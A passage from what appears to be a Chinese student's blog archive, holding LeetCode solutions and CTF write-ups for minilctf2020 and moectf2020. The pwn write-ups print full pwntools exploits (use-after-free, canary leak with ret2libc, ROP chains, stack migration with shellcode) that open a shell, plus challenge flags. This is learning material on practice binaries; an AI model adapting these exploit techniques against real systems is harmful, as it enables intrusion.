while(set_size[s2][0]!=s2) s2 = set_size[s2][0]; for(int i=0;i&lt;=set_size[s2][1];i++) { set_size[s1][1]++; set[s1][set_size[s1][1]] = set[s2][i]; } set_size[s2][0] = s1;}int* findRedundantConnection(int** edges, int edgesSize, int* edgesColSize, int* returnSize){ *returnSize = 2; int *ret = malloc(sizeof(long long int) * 2); ret[0] = 0; ret[1] = 0; for(int i=1;i&lt;=edgesSize;i++) { set_size[i][0] = set[i][0] = i; set_size[i][1] = 1; } int start, end; int flag1,flag2; for(int i=0;i&lt;edgesSize;i++) { start = edges[i][0]; end = edges[i][1]; flag1 = find_x(start); flag2 = find_x(end); if(flag1 == flag2) { ret[0] = start; ret[1] = end; return ret; } union_set(start,end); } return ret;} 由于一开始我们就初始化一个较大的二维数组，故空间复杂度上比较吃亏 优化：减少冗余步骤与空间我们尝试改变之前一拍脑门时繁复冗杂的写法，在归并时仅记录长度进行归并即可（即小集合归并到大集合），并使用动态数组以尽量减少空间使用 思路还是合之前的一样，构造代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/** * Note: The returned array must be malloced, assume caller calls free(). */int *set;int *set_size;int find_x(int src){ return set[src] == src ? src : find_x(set[src]);}void union_set(int s1, int s2){ s1 = find_x(s1); s2 = find_x(s2); if(set_size[s1]&lt;set_size[s2]) { set_size[s2] += set_size[s1]; set[s1] = set[s2]; } else { set_size[s1] += set_size[s2]; set[s2] = set[s1]; }}int* findRedundantConnection(int** edges, int edgesSize, int* edgesColSize, int* returnSize){ *returnSize = 2; int *ret = malloc(sizeof(int) * 2); set = (int*)malloc(sizeof(int)*(edgesSize+5)); set_size = (int*)malloc(sizeof(int)*(edgesSize+5)); ret[0] = 0; ret[1] = 0; for(int i=1;i&lt;=edgesSize;i++) { set[i] = i; set_size[i] = 1; } int start, end; int flag1,flag2; for(int i=0;i&lt;edgesSize;i++) { start = edges[i][0]; end = edges[i][1]; flag1 = find_x(start); flag2 = find_x(end); if(flag1 == flag2) { ret[0] = start; ret[1] = end; return ret; } union_set(start,end); } return ret;} （减少差不多一半空间，但是看起来并没有什么用…）","link":"/2021/02/16/leetcode%20-%20684/"},{"title":"Leetcode - 685：冗余连接II","text":"并查集并查集并查集… 685. 冗余连接 II（困难） 在本问题中，有根树指满足以下条件的有向图。该树只有一个根节点，所有其他节点都是该根节点的后继。每一个节点只有一个父节点，除了根节点没有父节点。 输入一个有向图，该图由一个有着N个节点 (节点值不重复1, 2, …, N) 的树及一条附加的边构成。附加的边的两个顶点包含在1到N中间，这条附加的边不属于树中已存在的边。 结果图是一个以边组成的二维数组。 每一个边 的元素是一对 [u, v]，用以表示有向图中连接顶点 u 和顶点 v 的边，其中 u 是 v 的一个父节点。 返回一条能删除的边，使得剩下的图是有N个节点的有根树。若有多个答案，返回最后出现在给定二维数组的答案。 示例 1: 输入: [[1,2], [1,3], [2,3]]输出: [2,3]解释: 给定的有向图如下:1/ v v2–&gt;3示例 2: 输入: [[1,2], [2,3], [3,4], [4,1], [1,5]]输出: [4,1]解释: 给定的有向图如下:5 &lt;- 1 -&gt; 2 ^ | | v 4 &lt;- 3注意: 二维数组大小的在3到1000范围内。二维数组中的每个整数在1到N之间，其中 N 是二维数组的大小。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/redundant-connection-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解法：并查集半夜三点多把前置题：684. 冗余连接给做了，感觉稍微有了点头绪，其实还是啥都不知道… 晚上大概想清楚了，同样是采用并查集的思想，不过考虑到该图为有向图，同时题目给定的图必定存在一条边使得该图无法成为一颗树 可能存在如下情况： 一个节点的入度大于等于2（存在两个及以上父结点，本题数据构造保证只可能存在两个父结点的情况） 图中存在回路 以上两种情况同时存在 如下图所示（字丑见谅QwQ）： 故我们很容易（并不Or2）能够得到解开这道题的算法： 将每一个结点初始化为一棵单独的树，其父结点初始化为自身 使用两个数组分别保存每个结点的父结点与所属的树的根结点 遍历每一条边，重新记录下每个结点的父结点与根节点 当一个结点的入度大于1时，记录该边为争议边 当一条边的始末结点同属于一棵树时，记录该条边为回路边 两种情况都不存在，则将该边的末结点的父结点标为该边的始结点，并合并两结点所在的树 当争议边不存在时，直接删除回路边 争议边若存在，若同时存在回路边，则删除争议边末尾结点及其父结点所构成边，否则删除争议边 构造代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182/** * Note: The returned array must be malloced, assume caller calls free(). */ /** * Note: The returned array must be malloced, assume caller calls free(). */int * ancestors;//记录每个节点的根结点int * parent;//记录每个节点的父结点int find_x(int x){ return x == ancestors[x] ? x : (ancestors[x] = find_x(ancestors[x]));//路径压缩}void union_ancestor(int a, int b){ ancestors[find_x(a)] = find_x(b);//将两棵树合并为一棵树}int* findRedundantDirectedConnection(int** edges, int edgesSize, int* edgesColSize, int* returnSize){ ancestors = (int*)malloc(sizeof(int)*(edgesSize+5)); parent = (int*)malloc(sizeof(int)*(edgesSize+5)); for(int i=1;i&lt;=edgesSize;i++) { parent[i] = ancestors[i] = i;//初始化每个结点为单独的一棵树（并查集），结点的父结点标记为自身 } //conflict：可能存在争议的边 //circle：可能形成回路的边 int start, end, a_start, a_end, conflict = -1, circle = -1; for(int i=0;i&lt;edgesSize;i++) { start = edges[i][0]; end = edges[i][1]; a_start = find_x(start); a_end = find_x(end); if(parent[end] != end)//该条边的尾结点已经与其他结点相连（即加上这条边后入度大于1） { conflict = i; } else { parent[end] = start; if(a_start == a_end) { circle = i;//该条边两结点的根结点相同，可能形成回路 } else { union_ancestor(start, end);//将两棵树合并为一棵树（并查集） } } } int *ret = (int*)malloc(sizeof(int)*2); *returnSize = 2; if(conflict&lt;0)//不存在争议边，只存在形成回路的边 { ret[0] = edges[circle][0]; ret[1] = edges[circle][1]; return ret; } else//存在争议边 { if(circle&gt;0)//同时存在回路边 { ret[0] = parent[edges[conflict][1]]; ret[1] = edges[conflict][1]; return ret; } else { ret[0] = edges[conflict][0]; ret[1] = edges[conflict][1]; return ret; } } return ret;}","link":"/2021/02/16/leetcode%20-%20685/"},{"title":"Leetcode - 968：监控二叉树","text":"鉴于你校人均OI背景…本萌新还是需要好好补充算法知识XD 968. 监控二叉树（困难） 给定一个二叉树，我们在树的节点上安装摄像头。 节点上的每个摄影头都可以监视其父对象、自身及其直接子对象。 计算监控树的所有节点所需的最小摄像头数量。 示例 1： 输入：[0,0,null,0,0]输出：1解释：如图所示，一台摄像头足以监控所有节点。示例 2： 输入：[0,0,null,0,null,0,null,null,0]输出：2解释：需要至少两个摄像头来监视树的所有节点。 上图显示了摄像头放置的有效位置之一。 提示： 给定树的节点数的范围是 [1, 1000]。每个节点的值都是 0。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/binary-tree-cameras著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 仔细想想，对于一个结点是否需要安装摄像头，其实是由其子树的状态来决定的，那么我们可以使用动态规划算法 解法：递归 + 深度优先搜索（DFS） + 动态规划（DP）大概如下图所示： 我们考虑有以下几种情况： 当一个结点的左或右子树没有被摄像头覆盖上时，这个结点必须要安装一个摄像头来监测其左或右子树，定义为状态码STATUS_CAMERA 当一个结点的左右子树都已经被摄像头覆盖上时，为了实现摄像头数量的最小化，需要在该结点的父结点放置摄像头，即在回到父结点前该结点都是未被覆盖的，定义为状态码STATUS_UNCOVERED 当一个结点的左右子树中存在摄像头，则该结点肯定是被覆盖了的，定义为状态码STATUS_COVERED 对于结点为NULL的情况，我们可以默认他是被覆盖了的结点，即定义为状态码STATUS_COVERED 同时，我们还需要对这棵树的根节点做一次单独的检测，以确定是否要在其上放置摄像头 为了方便判定，我们将STATUS_CAMERA设置为状态码中值相对大的一个 状态转移方程STATUS_ROOT = F(STATUS_LEFT, STATUS_RIGHT) 时间复杂度：n次遍历，线性时间复杂度O(N) 空间复杂度：递归算法要开辟n个栈空间，故为线性空间复杂度O(N) 构造代码如下： C语言版1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/** * Definition for a binary tree node. * struct TreeNode { * int val; * struct TreeNode *left; * struct TreeNode *right; * }; *//* * status code * 0: waiting for pwn * 1: has been pwn * 2: camara here *-1: inner error, just a placeholder in fact */#define STATUS_UNCOVERED 0#define STATUS_COVERED 1#define STATUS_CAMERA 2#define STATUS_ERROR -1int minCameraCover(struct TreeNode* root) { int amounts=0;//amounts of camera //add a camera to the root if status of root is 0 if(dfs(root,&amp;amounts) == STATUS_UNCOVERED) amounts++; return amounts;}int dfs(struct TreeNode* root, int * amounts){ //NULL pointer signed as status 1 if(!root) return STATUS_COVERED; //get the status of left and right node int left = dfs(root-&gt;left, amounts); int right = dfs(root-&gt;right, amounts); //if one of both uncovered yet, a camera is needed if(left == STATUS_UNCOVERED || right == STATUS_UNCOVERED) { (*amounts)++; return STATUS_CAMERA; } //if both are covered, father's of root may need a camera if(left == STATUS_COVERED &amp;&amp; right == STATUS_COVERED) return STATUS_UNCOVERED; //if there's at least one camera in both childs, the root is covered if(left + right &gt; STATUS_CAMERA) return STATUS_COVERED; //error code(not used) return STATUS_ERROR;} Python语言版：12345678910111213141516171819202122232425262728293031323334# Definition for a binary tree node.# class TreeNode:# def __init__(self, x):# self.val = x# self.left = None# self.right = None# status# 0 - waiting for pwn# 1 - has been pwn# 2 - camera here# -1 - error, just a placeholderclass Solution: amounts = 0 def dfs(self, root: TreeNode) -&gt; int: if root == None: return 1 left = self.dfs(root.left) right = self.dfs(root.right) if left == 1 and right == 1: return 0 if left == 0 or right == 0: self.amounts += 1 return 2 if left + right &gt; 2: return 1 return -1 def minCameraCover(self, root: TreeNode) -&gt; int: if self.dfs(root) == 0: self.amounts += 1 return self.amounts","link":"/2021/01/11/leetcode%20-%20968/"},{"title":"minilctf2020 write up for easycpp","text":"萌新做的第一道堆题… 0x00.安全检查首先是惯例的checksec 只开了NX保护，四舍五入等于没有 0x01.程序分析拖入IDA进行分析 用到了一个名为B的类，我们先看看这个类都有些啥 IDA中类B有一个构造函数B()和一个print()函数 类B的构造函数如下： 类B的构造函数首先调用了类A的构造函数，然后将变量_vptr_A设置为一个函数指针 我们不难看到在0x80489E4位置上我们还需要再跳转一次到0x80488F2的位置，这个位置上有一个B::print()函数，故可知这是一个二级函数指针 我们再来看看类A的构造函数，如下： 类A的构造函数也是将变量_vptr_A设置为一个函数指针 位于off_80489F0上的函数为A::print() 接下来是main函数的简单分析： v3、v4都是一个类型为类 B的指针 首先setvbuf()函数将程序设置为无缓冲输入 之后创建了一个类B的实例并将地址给到指针v3和v4 之后将该实例内的变量_vptr_A的值设为0 之后使用delete释放掉之前分配给v3、v4的内存 之后从标准输入流读入1024个字节到buf（或许有操作空间？） 之后调用strbuf()函数重新分配一段内存空间并将buf的值拷贝一份（当然最后并没有指针接收这一块内存，那么它会成为野内存吗？） 最后重新调用v4的函数指针变量所指向的函数 那么我们在这里就可以发现一个漏洞： 0x02.漏洞利用 - Use After Freev3、v4所指向的内存空间被释放后v3、v4并没有被设置为NULL，在运行到strdup()函数时这一块内存空间又被重新分配给strdup()函数，而之后又通过v4再次对这一块内存空间进行调用，很明显存在UAF（Use After Free）漏洞 同时我们可以发现存在一个backdoor()函数直接调用了system(&quot;/bin/sh&quot;)，可以直接getshell 故我们只需要覆写掉函数指针所指的函数为backdoor()函数即可getshell 构造二级指针的结构应为 buf buf+4 右边那一块的地址 -&gt; 指向backdoor函数的地址 buf的地址如下： 故得exp如下 1234567891011121314from pwn import *context.log_level = 'debug'p = process('easycpp')#p = remote('pwn.challenge.lctf.online', 10030)backdoor = 0x80487BBbuf = 0x804A0C0payload = p32(buf + 4) + p32(backdoor)p.sendline(payload)p.interactive() 向服务器发送payload，成功getsgell 可能是因为一些奇奇怪怪的原因，cat flag出来的flag不对","link":"/2021/01/18/minilctf2020%20write%20up%20for%20easycpp/"},{"title":"moectf2020 write up for RxEncode","text":"前言很难很难很难很难的一道逆向题QAQ非新手友好向QAQQQ 不敢想象后面的easyC++有多难Or2 逻辑分析拖入IDA中进行分析： 程序里头s2 + v15 + v16的地址是连在一起的，整体应当是一个被IDA解析成碎片的字符串 分析主函数逻辑可知程序会将我们输入的flag经过RxEncode()函数处理后与前面的那个字符串进行比对 核心函数：RxEncode()接下来分析RxEncode() 一堆看不懂的操作QAQ 不过我们可以发现其用到了一个find_pos()函数，里面有一个类似base64码表的东西 大胆猜测RxEncode()应当是一个换表base64解码（decode）函数！ 所以说这个起名方式… 写一个换表base64程序就能够得到flag啦~ 解码程序12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;using namespace std;char key_form[100] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234{}789+/=&quot;;char * encode(char * str);int main(void){ //initialize the encoded flag char decoded_flag[100]; long long *ptr = static_cast&lt;long long*&gt;((void*)decoded_flag); *ptr = 0x4AD158FEB59C879ALL; *(ptr + 1) = 0xCBEBFDFA6CED0BFELL; *(ptr + 2) = 0x7A47A38E43A334E8LL; *(ptr + 3) = 0x0000000000000000LL; *(ptr + 4) = 0; char * flag; //decode the flag flag = encode(decoded_flag); cout &lt;&lt; &quot;flag: &quot; &lt;&lt; flag &lt;&lt; endl;s //return 0 to the system return 0;}char * encode(char * str){ int len = strlen(str); int bins_used = 0; int index = 0; char * flag = static_cast&lt;char*&gt;(malloc(0x80)); for(int i=0;str[i];) { if(bins_used == 0) { unsigned char ch = str[i]; ch &gt;&gt;= 2; flag[index++] = ch; //flag[index++] = (str[i] &gt;&gt; 2); bins_used = 6; } else if (bins_used == 6) { unsigned char ch1 = str[i];ch1 &lt;&lt;= 6;ch1 &gt;&gt;= 2; unsigned char ch2 = str[i+1];ch2 &gt;&gt;= 4; flag[index++] = ch1+ ch2; //flag[index++] = (((str[i] &lt;&lt; 6) &gt;&gt; 2) + (str[i+1] &gt;&gt; 4)); bins_used = 4; i++; } else if (bins_used == 4) { unsigned char ch1 = str[i];ch1 &lt;&lt;= 4;ch1 &gt;&gt;= 2; unsigned char ch2 = str[i+1];ch2 &gt;&gt;= 6; flag[index++] = ch1+ ch2; //flag[index++] = ((str[i] &lt;&lt; 4) &gt;&gt; 2) + (str[i+1] &gt;&gt; 6); bins_used = 2; i++; } else if(bins_used == 2) { unsigned char ch = str[i]; ch &lt;&lt;= 2; ch &gt;&gt;= 2; flag[index++] = ch; //flag[index++] = ((str[i] &lt;&lt; 2) &gt;&gt; 2); bins_used = 0; i++; } } flag[index] = '\\0'; for(int i=0;i&lt;index;i++) { flag[i] = key_form[flag[i]]; } return flag;} 得到flag 1moectf{Y0Ur+C+1s+v3ry+g0o0OOo0d} 后面才发现python有好多可以用的库…好气啊… 不过我也不会python T T.. 以及还需要注意大小端序（wsm倒着存啊…以前的程序员思路好奇怪欸…） 12345678from base64 import *from string import *decoded_flag = b'\\x9A\\x87\\x9C\\xB5\\xFE\\x58\\xD1\\x4A\\xFE\\x0B\\xED\\x6C\\xFA\\xFD\\xEB\\xCB\\xE8\\x34\\xA3\\x43\\x8E\\xA3\\x47\\x7A'flag = b64encode(decoded_flag).decode().translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234{}789+/&quot;))print(flag)","link":"/2020/11/22/moectf2020%20write%20up%20for%20RxEncode/"},{"title":"moectf2020 write up for Frank，永远滴神","text":"这道题要我们统计所有文本文件中字符串FrankNB!的出现次数~ 直接用Java写轻松些，以及偷懒没写高级的字符串匹配算法（毕竟不会像OI那样TLEwwwwww） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import java.util.*;import java.lang.*;import java.io.*;public class Test{ public static int searchString(String path) { File file = new File(path); int num = 0; if(file.isDirectory())//if the variable &quot;file&quot; is a directory, files in it will be searched in recursion { boolean exist = false; File[] files = file.listFiles(); for(File f:files) { num += searchString(path+&quot;\\\\&quot;+f.getName()); } return num; } else { try (FileInputStream fileInputStream = new FileInputStream(file)) { FileOutputStream fileOutputStream = new FileOutputStream(new File(&quot;test.txt&quot;)); int c, index = 0; String str = &quot;&quot;; char[] frk = {'F','r','a','n','k','N','B','!'}; while((c = fileInputStream.read()) != -1)//EOF { str += String.valueOf((char)c); } int len = str.length(); for(int i=0;i&lt;len;i++) { c = str.charAt(i); if(c == frk[index]) { index++; if(c == '!') { index = 0; num++; } } else { i-=index; index = 0; } } } catch (Exception e) { System.out.print(&quot;\\n&quot;+file.getAbsolutePath()); e.printStackTrace(); } return num; } } public static void main(String[] args) { System.out.println(searchString(args[0])); }} 得到205232次 base64编码即得flag&gt; &lt; 1moectf{MjA1MjMy}","link":"/2020/11/13/moectf%202020%20write%20up%20for%20frk,yyds/"},{"title":"moectf2020 write up for baby canary","text":"前言moectf2020的pwn的压轴题，萌新大半夜照着官方题解看了好久，才勉勉强强磕磕碰碰地看明白了QAQ A3师傅好坏啊，新生赛出这么难的题！ PRE.DEFINITION OF CANARY 我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。 由于 stack overflow 而引发的攻击非常普遍也非常古老，相应地一种叫做 Canary 的 mitigation 技术很早就出现在 glibc 里，直到现在也作为系统安全的第一道防线存在。 Canary 不管是实现还是设计思想都比较简单高效，就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。 Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配。 CTF wiki: Canary 大概意思是说在栈上会放一个值…这个值在old ebp和返回地址的前面…要是发生栈溢出修改后面的值的话这个值自然也是会被修改的…因此就能检测到了XD 0x00.安全检查首先是惯例的checksec 可以看到除了地址随机化以外都开了 当然，看名字就知道这题肯定要考巨难的canary（Or2… 0x01.逆向分析拖入IDA进行分析 我们可以看到最大读入0x100字节的输入，可以把整个栈给改写得一塌糊涂，但是会被canary检测发现&gt; &lt;！ 唯一的一个可塑的输出点是printf，说明在这里很有可能存在操作空间！ 0x02.漏洞利用canary泄露canary存在高字节截断，如果我们使用0x4c-0xc+1的padding覆写掉canary的最高位字节\\x00，这样程序在调用printf函数时便会输出canary的值！ 也就是partial overwrite 那么我们的第一条payload就出来了： 1payload1 = b'A'*(0x4c-0xc+1) 之后程序在输出完我们的输入之后还会再输出一些东西，而其中的前三个字节便是canary的低三位字节 于是我们便能够得到canary的值了&gt; &lt;！ 123p.send(payload1)p.recvuntil(payload1)canary = u32('\\x00'+p.recv(3)) ret2libc得到了canary的值之后我们就可以尽情地溢出了wwwww 同时我们可以发现不存在可以直接getshell的system()函数或是/bin/sh字符串 题目给出了libc.so.6文件，故考虑ret2libc，构造rop链先将函数返回至puts，输出puts函数的真实地址（储存在got表中），之后计算出libc的基址，再计算出libc中system函数与/bin/sh字符串的真实地址，最后构造rop链执行system(&quot;/bin/sh&quot;)即可getshell exp最终构造exp如下： 12345678910111213141516171819202122232425262728293031323334#python3from pwn import *p = remote('sec.arttnba3.cn',10003)e = ELF('./baby_canary')libc = ELF('./libc.so.6')puts_got = e.got['puts']puts_plt = e.plt['puts']p.recv()payload1 = b'A'*(0x4c-0xc+1)p.send(payload1)p.recvuntil(payload1)canary = u32(b'\\x00'+p.recv(3))p.recv()payload2 = b'A'*(0x4c-0xc) + p32(canary) + b'A'*(0xc-4) + p32(0xdeadbeef) + p32(puts_plt)+ p32(e.sym['main']) + p32(puts_got)p.send(payload2)p.recvuntil('flag!\\n')puts_addr = p.recv(4)puts_addr = u32(puts_addr)libc_base = puts_addr - libc.sym['puts']sys_addr = libc_base + libc.sym['system']sh_addr = libc_base + libc.search(b'/bin/sh').__next__()p.send(payload1)payload3 = b'A'*(0x4c-0xc) + p32(canary) + b'A'*(0xc-4) + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)p.send(payload3)p.interactive() 运行exp，成功getshell，撒花花~~🌸🌸🌸 最后我们就能得到flag啦~ 1moectf{W0w_Y0u_c@n_e5cap3_fr0m_c4nary!}","link":"/2021/01/15/moectf2020%20write%20up%20for%20baby%20canary/"},{"title":"moectf2020 write up for 赤道企鹅，永远滴神","text":"感觉这一题其实比上一题简单，但是分倒是比上一题多XD 直接逐个字符匹配一遍就行，时间复杂度O(N) 以及文件读写还是Java写的方便（咱不会python…qwq 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import java.util.*;import java.lang.*;import java.io.*;public class Test{ public static int searchString(String path) { File file = new File(path); int num = 0; if(file.isDirectory())//if the variable &quot;file&quot; is a directory, files in it will be searched in recursion { boolean exist = false; File[] files = file.listFiles(); for(File f:files) { num += searchString(path+&quot;\\\\&quot;+f.getName()); } return num; } else { try (FileInputStream fileInputStream = new FileInputStream(file)) { int c, index = 0; boolean pd = false; char[] eqqie = {'E','q','q','i','e','N','B','!'}; while(true)//EOF { c = fileInputStream.read(); if(index&lt;8) { if(c == eqqie[index]) { index++; continue; } else return 0; } if((c&gt;='A'&amp;&amp;c&lt;='Z')||(c&gt;='a'&amp;&amp;c&lt;='z')||(c&gt;='0'&amp;&amp;c&lt;='9')) { pd = true; } else { if(pd) num++; pd = false; if(c == -1) return num; } } } catch (Exception e) { System.out.print(&quot;\\n&quot;+file.getAbsolutePath()); e.printStackTrace(); } return num; } } public static void main(String[] args) { System.out.println(searchString(args[0])); }} base64编码即得flag 1moectf{MTgyNDI2}","link":"/2020/11/13/moectf2020%20write%20up%20for%20eqqie,yyds/"},{"title":"moectf2020 write up for mess","text":"一道简单的编程语言应用题&gt; &lt; 题干给出的加密代码如下 1234567891011121314151617181920import randomflag = 'moectf{xxxxxxxxxxx}'digit = ''for i in flag: digit += str(ord(i))i = 0while i &lt; len(digit): n = random.randint(0, 128) if ord('a') &lt;= n &lt;= ord('z') or ord('A') &lt;= n &lt;= ord('Z'): digit = digit[0:i] + chr(n) + digit[i:] i += 1with open('puzzle.txt', 'w') as out: out.write(digit) 加密后字符串如下 11091111A01ruVJl99hw11Qv6i102xCYC1c2B31DIsz1tm212l11A1l610448re11BQ09549115951n154V895F115d49109h1m1210810j11w2A5 这个时候我们就很容易看出加密过程为字符串转ASCII码转字符串再随机插入英文字母啦 故构造逆向代码如下 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;cctype&gt;#include &lt;cstring&gt;using namespace std;int main(void){ char ch[200] = &quot;1091111A01ruVJl99hw11Qv6i102xCYC1c2B31DIsz1tm212l11A1l610448re11BQ09549115951n154V895F115d49109h1m1210810j11w2A5&quot;; int len = strlen(ch); char str[100]={0}; for(int i=0;i&lt;len;i++) if(isdigit(ch[i])) str[strlen(str)] = ch[i]; len = strlen(str); int digit = 0; for(int i=0;i&lt;len;i++) { digit = digit*10; digit += str[i]-'0'; if(digit&gt;='0') { cout &lt;&lt; (char)digit; digit = 0; } }} 获得flag 1moectf{pyth0n_1s_s0_s1mple} （python is so simple（指我用C++写题（x（wwwwww","link":"/2020/11/13/moectf2020%20write%20up%20for%20mess/"},{"title":"moectf2020 write up for rop1","text":"前言第一次开始尝试ROP，还真是一门神奇的技术呢Or2… 0x00.什么是ROPROP即为Return-Oriented Programming ——返回导向编程， 是一种可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）的高级的内存攻击技术。 其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 ctf-wifi：Basic ROP 0x01.安全检查首先在Linux下使用checksec指令分析，发现其开启了栈不可执行保护 0x02.逆向分析将程序拖入IDA分析，发现存在gets函数，很明显存在栈溢出 0x03.漏洞利用我们尝试将断点下在call _gets，即0x40087f的地以计算偏移量 1234$ gdb$ file rop1$ b *0x40087f$ r 由lea rax, [rbp-0x80]我们可以看到该字符串为基于rbp的索引，故其相对于返回地址的偏移即为0x80+8，也就是128个字节再加上8字节的rbp，之后就是函数的返回地址 因此我们构造的payload基础模型应当是： 12target_addr = p64(addr_of_target)payload = b'A'*128 + target_addr 然后我们就应该开始寻找需要用的gadget（程序小片段）了 一般来说只要找到system(&quot;/bin/sh&quot;)就可以getshell了 然而我们不难看出，程序中虽然存在着system函数，但是却是system(&quot;eqqie&quot;)。。。 尝试了一下eqqie师傅并没有设置额外的eqqie命令，因此很明显我们不能直接返回到这个函数的地址上 但是这也告诉我们有system函数的gadget，接下来只需要再找到/bin/sh字符串就可以凑出system('/bin/sh') 我们很容易在.data段找到&quot;/bin/sh&quot; 那么我们只需要先在rdi寄存器内写入&quot;/bin/sh&quot;的地址再调用system函数即可getshell 但是我们直接找似乎找不到pop rdi 别慌www，在IDA内我们可以找到一段指令是 1pop r15 按下D展开变成数据 再按下C变成指令 得到指令： 12pop rdiretn 于是我们就成功得到了改变rdi寄存器的gadget的地址 接下来我们就可以构造payload了 123456789101112from pwn import *p = process('rop1')#p = remote('sec.eqqie.cn',10004)pop_rdi = p64(0x400933)sh_addr = p64(0x601070)call_sys = p64(0x4007df)payload = b'A'*136 + pop_rdi + sh_addr + call_sysp.recv()p.sendline(payload)p.interactive() 连接服务器，使用我们的payload来getshell 得到flag 1moectf{67d14388-9052-4182-869c-5e5f0cdac4e5} 注：也可以使用工具ROPgadget来寻找gadget Linux下，上面寻找gadget的步骤也可以如下： 1$ ROPgadget --binary rop1 --string '/bin/sh' 1$ ROPgadget --binary rop1 --only 'pop|ret' 参考资料：https://www.cnblogs.com/ichunqiu/p/9288935.html","link":"/2020/11/26/moectf2020%20write%20up%20for%20rop1/"},{"title":"moectf2020 write up for rop2","text":"前言和上一道题其实是差不多的，但是想了半天才想明白是怎么一回事QAQ 0x00.安全检查首先使用checksec指令，发现其存在栈不可执行保护 0x01.逆向分析拖进IDA，我们可以看到这一题和ROP1基本上没有太大的不同，都是直接存在gets函数的溢出漏洞 以及system函数的gadget和pop rdi的gadget (plt表里也有system) 不同的是，这一次并没有给我们预留下可以利用的&quot;/bin/sh&quot;字符串Or2 0x02.漏洞利用那么我们是否可以手动读入/bin/sh字符串呢？答案是肯定的 首先存在gets()函数可以读入字符串 其次我们在IDA中按下CTRL + S，可以看到存在一个可以供我们读写的.bss段 那么我们只需要将/bin/sh字符串读到这个段上，再将之作为system函数的参数即可getshell 那么我们可以构造payload如下： 1234567891011121314from pwn import *e = ELF('rop2')gets_addr = p64(e.symbols['gets'])sys_addr = p64(e.symbols['system'])pop_rdi = p64(0x400933)bss_addr = p64(0x601080)#也可以用 e.bss() 快速获取可读写.bss段地址payload = b'A'*136 + pop_rdi + bss_addr + gets_addr + pop_rdi + bss_addr + sys_addrp = process('rop2')#p = remote('sec.eqqie.cn',10005)p.sendline(payload)p.sendline('/bin/sh')p.interactive() 连接服务器，发送我们的payload，即可getshell 得到flag： 1moectf{d44bc3cb-471b-4906-822b-ea5cb32c4acb}","link":"/2020/12/09/moectf2020%20write%20up%20for%20rop2/"},{"title":"moectf2020 write up for baby migration","text":"前言神奇的栈迁移，想了半天才明白Or2… 0x00.安全检查首先是惯例的checksec 四舍五入保护全关 0x01.逆向分析拖入IDA进行分析 我们可以看到存在栈溢出，可供溢出字节为66-0x30=18个字节，也就是说基本上只够覆盖rbp（8字节）+返回地址（8字节），空间十分拥挤，同时程序里也没有能够直接利用的gadget 但是我们可以观察到在bss段有极大的可读写空间 0x02.漏洞利用故考虑栈迁移，将栈迁移到bss段再放上我们的shellcode 构造exp如下： 12345678910111213141516from pwn import *offset = 0x30bss = 0x404060back_to_gets = 0x4011c8sc = b'\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05'payload1 = b'A'*offset + p64(bss+500) + p64(back_to_gets)payload2 = sc + b'A'*(offset - len(sc)) + p64(bss+500) + p64(bss+500-offset)p = process('./baby_migration')#p = remote('sec.arttnba3.cn', 10002)p.recv()p.sendline(payload1)sleep(1)p.sendline(payload2)p.interactive() 运行脚本即得flag 1moectf{5tack_m1gr@ti0n_1s_e4sy!}","link":"/2020/12/26/moectf2020%20write%20up%20for%20stack%20migration/"},{"title":"moectf2020 write up for ⑨的完美算术教室","text":"琪露诺很可爱！！歌也很好听！！但是题的脑洞也比想象中大QAQ 思路首先想到按照正常的的思路去计算式子的结果，但是每次都在第二个式子断了QAQ 后面发现每次给出的第一个式子都是5+4=?，结果都是9，联想到琪露诺又被称作⑨，故尝试每次都输入9，连接没有断开…！！！ 使用python脚本尝试一直输入9，不知道在第几次的时候flag就出来啦&gt; &lt; 